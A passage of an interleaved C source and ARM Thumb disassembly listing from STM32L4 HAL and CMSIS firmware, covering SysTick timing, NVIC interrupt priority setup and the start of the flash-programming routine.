 8001162:	46bd      	mov	sp, r7
 8001164:	bd80      	pop	{r7, pc}
	...

08001168 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 8001168:	b580      	push	{r7, lr}
 800116a:	b084      	sub	sp, #16
 800116c:	af00      	add	r7, sp, #0
 800116e:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 8001170:	2300      	movs	r3, #0
 8001172:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 8001174:	4b17      	ldr	r3, [pc, #92]	; (80011d4 <HAL_InitTick+0x6c>)
 8001176:	781b      	ldrb	r3, [r3, #0]
 8001178:	2b00      	cmp	r3, #0
 800117a:	d023      	beq.n	80011c4 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 800117c:	4b16      	ldr	r3, [pc, #88]	; (80011d8 <HAL_InitTick+0x70>)
 800117e:	681a      	ldr	r2, [r3, #0]
 8001180:	4b14      	ldr	r3, [pc, #80]	; (80011d4 <HAL_InitTick+0x6c>)
 8001182:	781b      	ldrb	r3, [r3, #0]
 8001184:	4619      	mov	r1, r3
 8001186:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 800118a:	fbb3 f3f1 	udiv	r3, r3, r1
 800118e:	fbb2 f3f3 	udiv	r3, r2, r3
 8001192:	4618      	mov	r0, r3
 8001194:	f000 f96d 	bl	8001472 <HAL_SYSTICK_Config>
 8001198:	4603      	mov	r3, r0
 800119a:	2b00      	cmp	r3, #0
 800119c:	d10f      	bne.n	80011be <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 800119e:	687b      	ldr	r3, [r7, #4]
 80011a0:	2b0f      	cmp	r3, #15
 80011a2:	d809      	bhi.n	80011b8 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 80011a4:	2200      	movs	r2, #0
 80011a6:	6879      	ldr	r1, [r7, #4]
 80011a8:	f04f 30ff 	mov.w	r0, #4294967295
 80011ac:	f000 f937 	bl	800141e <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 80011b0:	4a0a      	ldr	r2, [pc, #40]	; (80011dc <HAL_InitTick+0x74>)
 80011b2:	687b      	ldr	r3, [r7, #4]
 80011b4:	6013      	str	r3, [r2, #0]
 80011b6:	e007      	b.n	80011c8 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 80011b8:	2301      	movs	r3, #1
 80011ba:	73fb      	strb	r3, [r7, #15]
 80011bc:	e004      	b.n	80011c8 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 80011be:	2301      	movs	r3, #1
 80011c0:	73fb      	strb	r3, [r7, #15]
 80011c2:	e001      	b.n	80011c8 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 80011c4:	2301      	movs	r3, #1
 80011c6:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 80011c8:	7bfb      	ldrb	r3, [r7, #15]
}
 80011ca:	4618      	mov	r0, r3
 80011cc:	3710      	adds	r7, #16
 80011ce:	46bd      	mov	sp, r7
 80011d0:	bd80      	pop	{r7, pc}
 80011d2:	bf00      	nop
 80011d4:	20000008 	.word	0x20000008
 80011d8:	20000000 	.word	0x20000000
 80011dc:	20000004 	.word	0x20000004

080011e0 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 80011e0:	b480      	push	{r7}
 80011e2:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 80011e4:	4b06      	ldr	r3, [pc, #24]	; (8001200 <HAL_IncTick+0x20>)
 80011e6:	781b      	ldrb	r3, [r3, #0]
 80011e8:	461a      	mov	r2, r3
 80011ea:	4b06      	ldr	r3, [pc, #24]	; (8001204 <HAL_IncTick+0x24>)
 80011ec:	681b      	ldr	r3, [r3, #0]
 80011ee:	4413      	add	r3, r2
 80011f0:	4a04      	ldr	r2, [pc, #16]	; (8001204 <HAL_IncTick+0x24>)
 80011f2:	6013      	str	r3, [r2, #0]
}
 80011f4:	bf00      	nop
 80011f6:	46bd      	mov	sp, r7
 80011f8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80011fc:	4770      	bx	lr
 80011fe:	bf00      	nop
 8001200:	20000008 	.word	0x20000008
 8001204:	200003b8 	.word	0x200003b8

08001208 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 8001208:	b480      	push	{r7}
 800120a:	af00      	add	r7, sp, #0
  return uwTick;
 800120c:	4b03      	ldr	r3, [pc, #12]	; (800121c <HAL_GetTick+0x14>)
 800120e:	681b      	ldr	r3, [r3, #0]
}
 8001210:	4618      	mov	r0, r3
 8001212:	46bd      	mov	sp, r7
 8001214:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001218:	4770      	bx	lr
 800121a:	bf00      	nop
 800121c:	200003b8 	.word	0x200003b8

08001220 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 8001220:	b580      	push	{r7, lr}
 8001222:	b084      	sub	sp, #16
 8001224:	af00      	add	r7, sp, #0
 8001226:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 8001228:	f7ff ffee 	bl	8001208 <HAL_GetTick>
 800122c:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 800122e:	687b      	ldr	r3, [r7, #4]
 8001230:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 8001232:	68fb      	ldr	r3, [r7, #12]
 8001234:	f1b3 3fff 	cmp.w	r3, #4294967295
 8001238:	d005      	beq.n	8001246 <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 800123a:	4b0a      	ldr	r3, [pc, #40]	; (8001264 <HAL_Delay+0x44>)
 800123c:	781b      	ldrb	r3, [r3, #0]
 800123e:	461a      	mov	r2, r3
 8001240:	68fb      	ldr	r3, [r7, #12]
 8001242:	4413      	add	r3, r2
 8001244:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 8001246:	bf00      	nop
 8001248:	f7ff ffde 	bl	8001208 <HAL_GetTick>
 800124c:	4602      	mov	r2, r0
 800124e:	68bb      	ldr	r3, [r7, #8]
 8001250:	1ad3      	subs	r3, r2, r3
 8001252:	68fa      	ldr	r2, [r7, #12]
 8001254:	429a      	cmp	r2, r3
 8001256:	d8f7      	bhi.n	8001248 <HAL_Delay+0x28>
  {
  }
}
 8001258:	bf00      	nop
 800125a:	bf00      	nop
 800125c:	3710      	adds	r7, #16
 800125e:	46bd      	mov	sp, r7
 8001260:	bd80      	pop	{r7, pc}
 8001262:	bf00      	nop
 8001264:	20000008 	.word	0x20000008

08001268 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001268:	b480      	push	{r7}
 800126a:	b085      	sub	sp, #20
 800126c:	af00      	add	r7, sp, #0
 800126e:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 8001270:	687b      	ldr	r3, [r7, #4]
 8001272:	f003 0307 	and.w	r3, r3, #7
 8001276:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 8001278:	4b0c      	ldr	r3, [pc, #48]	; (80012ac <__NVIC_SetPriorityGrouping+0x44>)
 800127a:	68db      	ldr	r3, [r3, #12]
 800127c:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 800127e:	68ba      	ldr	r2, [r7, #8]
 8001280:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 8001284:	4013      	ands	r3, r2
 8001286:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 8001288:	68fb      	ldr	r3, [r7, #12]
 800128a:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 800128c:	68bb      	ldr	r3, [r7, #8]
 800128e:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 8001290:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 8001294:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001298:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 800129a:	4a04      	ldr	r2, [pc, #16]	; (80012ac <__NVIC_SetPriorityGrouping+0x44>)
 800129c:	68bb      	ldr	r3, [r7, #8]
 800129e:	60d3      	str	r3, [r2, #12]
}
 80012a0:	bf00      	nop
 80012a2:	3714      	adds	r7, #20
 80012a4:	46bd      	mov	sp, r7
 80012a6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012aa:	4770      	bx	lr
 80012ac:	e000ed00 	.word	0xe000ed00

080012b0 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 80012b0:	b480      	push	{r7}
 80012b2:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 80012b4:	4b04      	ldr	r3, [pc, #16]	; (80012c8 <__NVIC_GetPriorityGrouping+0x18>)
 80012b6:	68db      	ldr	r3, [r3, #12]
 80012b8:	0a1b      	lsrs	r3, r3, #8
 80012ba:	f003 0307 	and.w	r3, r3, #7
}
 80012be:	4618      	mov	r0, r3
 80012c0:	46bd      	mov	sp, r7
 80012c2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012c6:	4770      	bx	lr
 80012c8:	e000ed00 	.word	0xe000ed00

080012cc <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80012cc:	b480      	push	{r7}
 80012ce:	b083      	sub	sp, #12
 80012d0:	af00      	add	r7, sp, #0
 80012d2:	4603      	mov	r3, r0
 80012d4:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 80012d6:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012da:	2b00      	cmp	r3, #0
 80012dc:	db0b      	blt.n	80012f6 <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 80012de:	79fb      	ldrb	r3, [r7, #7]
 80012e0:	f003 021f 	and.w	r2, r3, #31
 80012e4:	4907      	ldr	r1, [pc, #28]	; (8001304 <__NVIC_EnableIRQ+0x38>)
 80012e6:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012ea:	095b      	lsrs	r3, r3, #5
 80012ec:	2001      	movs	r0, #1
 80012ee:	fa00 f202 	lsl.w	r2, r0, r2
 80012f2:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 80012f6:	bf00      	nop
 80012f8:	370c      	adds	r7, #12
 80012fa:	46bd      	mov	sp, r7
 80012fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001300:	4770      	bx	lr
 8001302:	bf00      	nop
 8001304:	e000e100 	.word	0xe000e100

08001308 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 8001308:	b480      	push	{r7}
 800130a:	b083      	sub	sp, #12
 800130c:	af00      	add	r7, sp, #0
 800130e:	4603      	mov	r3, r0
 8001310:	6039      	str	r1, [r7, #0]
 8001312:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001314:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001318:	2b00      	cmp	r3, #0
 800131a:	db0a      	blt.n	8001332 <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800131c:	683b      	ldr	r3, [r7, #0]
 800131e:	b2da      	uxtb	r2, r3
 8001320:	490c      	ldr	r1, [pc, #48]	; (8001354 <__NVIC_SetPriority+0x4c>)
 8001322:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001326:	0112      	lsls	r2, r2, #4
 8001328:	b2d2      	uxtb	r2, r2
 800132a:	440b      	add	r3, r1
 800132c:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 8001330:	e00a      	b.n	8001348 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001332:	683b      	ldr	r3, [r7, #0]
 8001334:	b2da      	uxtb	r2, r3
 8001336:	4908      	ldr	r1, [pc, #32]	; (8001358 <__NVIC_SetPriority+0x50>)
 8001338:	79fb      	ldrb	r3, [r7, #7]
 800133a:	f003 030f 	and.w	r3, r3, #15
 800133e:	3b04      	subs	r3, #4
 8001340:	0112      	lsls	r2, r2, #4
 8001342:	b2d2      	uxtb	r2, r2
 8001344:	440b      	add	r3, r1
 8001346:	761a      	strb	r2, [r3, #24]
}
 8001348:	bf00      	nop
 800134a:	370c      	adds	r7, #12
 800134c:	46bd      	mov	sp, r7
 800134e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001352:	4770      	bx	lr
 8001354:	e000e100 	.word	0xe000e100
 8001358:	e000ed00 	.word	0xe000ed00

0800135c <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 800135c:	b480      	push	{r7}
 800135e:	b089      	sub	sp, #36	; 0x24
 8001360:	af00      	add	r7, sp, #0
 8001362:	60f8      	str	r0, [r7, #12]
 8001364:	60b9      	str	r1, [r7, #8]
 8001366:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 8001368:	68fb      	ldr	r3, [r7, #12]
 800136a:	f003 0307 	and.w	r3, r3, #7
 800136e:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 8001370:	69fb      	ldr	r3, [r7, #28]
 8001372:	f1c3 0307 	rsb	r3, r3, #7
 8001376:	2b04      	cmp	r3, #4
 8001378:	bf28      	it	cs
 800137a:	2304      	movcs	r3, #4
 800137c:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 800137e:	69fb      	ldr	r3, [r7, #28]
 8001380:	3304      	adds	r3, #4
 8001382:	2b06      	cmp	r3, #6
 8001384:	d902      	bls.n	800138c <NVIC_EncodePriority+0x30>
 8001386:	69fb      	ldr	r3, [r7, #28]
 8001388:	3b03      	subs	r3, #3
 800138a:	e000      	b.n	800138e <NVIC_EncodePriority+0x32>
 800138c:	2300      	movs	r3, #0
 800138e:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001390:	f04f 32ff 	mov.w	r2, #4294967295
 8001394:	69bb      	ldr	r3, [r7, #24]
 8001396:	fa02 f303 	lsl.w	r3, r2, r3
 800139a:	43da      	mvns	r2, r3
 800139c:	68bb      	ldr	r3, [r7, #8]
 800139e:	401a      	ands	r2, r3
 80013a0:	697b      	ldr	r3, [r7, #20]
 80013a2:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 80013a4:	f04f 31ff 	mov.w	r1, #4294967295
 80013a8:	697b      	ldr	r3, [r7, #20]
 80013aa:	fa01 f303 	lsl.w	r3, r1, r3
 80013ae:	43d9      	mvns	r1, r3
 80013b0:	687b      	ldr	r3, [r7, #4]
 80013b2:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 80013b4:	4313      	orrs	r3, r2
         );
}
 80013b6:	4618      	mov	r0, r3
 80013b8:	3724      	adds	r7, #36	; 0x24
 80013ba:	46bd      	mov	sp, r7
 80013bc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80013c0:	4770      	bx	lr
	...

080013c4 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 80013c4:	b580      	push	{r7, lr}
 80013c6:	b082      	sub	sp, #8
 80013c8:	af00      	add	r7, sp, #0
 80013ca:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 80013cc:	687b      	ldr	r3, [r7, #4]
 80013ce:	3b01      	subs	r3, #1
 80013d0:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 80013d4:	d301      	bcc.n	80013da <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 80013d6:	2301      	movs	r3, #1
 80013d8:	e00f      	b.n	80013fa <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 80013da:	4a0a      	ldr	r2, [pc, #40]	; (8001404 <SysTick_Config+0x40>)
 80013dc:	687b      	ldr	r3, [r7, #4]
 80013de:	3b01      	subs	r3, #1
 80013e0:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 80013e2:	210f      	movs	r1, #15
 80013e4:	f04f 30ff 	mov.w	r0, #4294967295
 80013e8:	f7ff ff8e 	bl	8001308 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 80013ec:	4b05      	ldr	r3, [pc, #20]	; (8001404 <SysTick_Config+0x40>)
 80013ee:	2200      	movs	r2, #0
 80013f0:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 80013f2:	4b04      	ldr	r3, [pc, #16]	; (8001404 <SysTick_Config+0x40>)
 80013f4:	2207      	movs	r2, #7
 80013f6:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 80013f8:	2300      	movs	r3, #0
}
 80013fa:	4618      	mov	r0, r3
 80013fc:	3708      	adds	r7, #8
 80013fe:	46bd      	mov	sp, r7
 8001400:	bd80      	pop	{r7, pc}
 8001402:	bf00      	nop
 8001404:	e000e010 	.word	0xe000e010

08001408 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001408:	b580      	push	{r7, lr}
 800140a:	b082      	sub	sp, #8
 800140c:	af00      	add	r7, sp, #0
 800140e:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 8001410:	6878      	ldr	r0, [r7, #4]
 8001412:	f7ff ff29 	bl	8001268 <__NVIC_SetPriorityGrouping>
}
 8001416:	bf00      	nop
 8001418:	3708      	adds	r7, #8
 800141a:	46bd      	mov	sp, r7
 800141c:	bd80      	pop	{r7, pc}

0800141e <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 800141e:	b580      	push	{r7, lr}
 8001420:	b086      	sub	sp, #24
 8001422:	af00      	add	r7, sp, #0
 8001424:	4603      	mov	r3, r0
 8001426:	60b9      	str	r1, [r7, #8]
 8001428:	607a      	str	r2, [r7, #4]
 800142a:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 800142c:	2300      	movs	r3, #0
 800142e:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 8001430:	f7ff ff3e 	bl	80012b0 <__NVIC_GetPriorityGrouping>
 8001434:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 8001436:	687a      	ldr	r2, [r7, #4]
 8001438:	68b9      	ldr	r1, [r7, #8]
 800143a:	6978      	ldr	r0, [r7, #20]
 800143c:	f7ff ff8e 	bl	800135c <NVIC_EncodePriority>
 8001440:	4602      	mov	r2, r0
 8001442:	f997 300f 	ldrsb.w	r3, [r7, #15]
 8001446:	4611      	mov	r1, r2
 8001448:	4618      	mov	r0, r3
 800144a:	f7ff ff5d 	bl	8001308 <__NVIC_SetPriority>
}
 800144e:	bf00      	nop
 8001450:	3718      	adds	r7, #24
 8001452:	46bd      	mov	sp, r7
 8001454:	bd80      	pop	{r7, pc}

08001456 <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8001456:	b580      	push	{r7, lr}
 8001458:	b082      	sub	sp, #8
 800145a:	af00      	add	r7, sp, #0
 800145c:	4603      	mov	r3, r0
 800145e:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 8001460:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001464:	4618      	mov	r0, r3
 8001466:	f7ff ff31 	bl	80012cc <__NVIC_EnableIRQ>
}
 800146a:	bf00      	nop
 800146c:	3708      	adds	r7, #8
 800146e:	46bd      	mov	sp, r7
 8001470:	bd80      	pop	{r7, pc}

08001472 <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 8001472:	b580      	push	{r7, lr}
 8001474:	b082      	sub	sp, #8
 8001476:	af00      	add	r7, sp, #0
 8001478:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 800147a:	6878      	ldr	r0, [r7, #4]
 800147c:	f7ff ffa2 	bl	80013c4 <SysTick_Config>
 8001480:	4603      	mov	r3, r0
}
 8001482:	4618      	mov	r0, r3
 8001484:	3708      	adds	r7, #8
 8001486:	46bd      	mov	sp, r7
 8001488:	bd80      	pop	{r7, pc}
	...

0800148c <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 800148c:	b580      	push	{r7, lr}
 800148e:	b086      	sub	sp, #24
 8001490:	af00      	add	r7, sp, #0
 8001492:	60f8      	str	r0, [r7, #12]
 8001494:	60b9      	str	r1, [r7, #8]
 8001496:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 800149a:	2300      	movs	r3, #0
 800149c:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800149e:	4b2f      	ldr	r3, [pc, #188]	; (800155c <HAL_FLASH_Program+0xd0>)
 80014a0:	781b      	ldrb	r3, [r3, #0]
 80014a2:	2b01      	cmp	r3, #1
 80014a4:	d101      	bne.n	80014aa <HAL_FLASH_Program+0x1e>
 80014a6:	2302      	movs	r3, #2
 80014a8:	e053      	b.n	8001552 <HAL_FLASH_Program+0xc6>
 80014aa:	4b2c      	ldr	r3, [pc, #176]	; (800155c <HAL_FLASH_Program+0xd0>)
 80014ac:	2201      	movs	r2, #1
 80014ae:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80014b0:	f24c 3050 	movw	r0, #50000	; 0xc350
 80014b4:	f000 f888 	bl	80015c8 <FLASH_WaitForLastOperation>
 80014b8:	4603      	mov	r3, r0
 80014ba:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 80014bc:	7dfb      	ldrb	r3, [r7, #23]
 80014be:	2b00      	cmp	r3, #0
 80014c0:	d143      	bne.n	800154a <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80014c2:	4b26      	ldr	r3, [pc, #152]	; (800155c <HAL_FLASH_Program+0xd0>)
 80014c4:	2200      	movs	r2, #0
 80014c6:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80014c8:	4b25      	ldr	r3, [pc, #148]	; (8001560 <HAL_FLASH_Program+0xd4>)
 80014ca:	681b      	ldr	r3, [r3, #0]
 80014cc:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80014d0:	2b00      	cmp	r3, #0
 80014d2:	d009      	beq.n	80014e8 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 80014d4:	4b22      	ldr	r3, [pc, #136]	; (8001560 <HAL_FLASH_Program+0xd4>)
 80014d6:	681b      	ldr	r3, [r3, #0]
 80014d8:	4a21      	ldr	r2, [pc, #132]	; (8001560 <HAL_FLASH_Program+0xd4>)
 80014da:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80014de:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 80014e0:	4b1e      	ldr	r3, [pc, #120]	; (800155c <HAL_FLASH_Program+0xd0>)
 80014e2:	2202      	movs	r2, #2
 80014e4:	771a      	strb	r2, [r3, #28]
 80014e6:	e002      	b.n	80014ee <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80014e8:	4b1c      	ldr	r3, [pc, #112]	; (800155c <HAL_FLASH_Program+0xd0>)
 80014ea:	2200      	movs	r2, #0
 80014ec:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 80014ee:	68fb      	ldr	r3, [r7, #12]
 80014f0:	2b00      	cmp	r3, #0
 80014f2:	d107      	bne.n	8001504 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
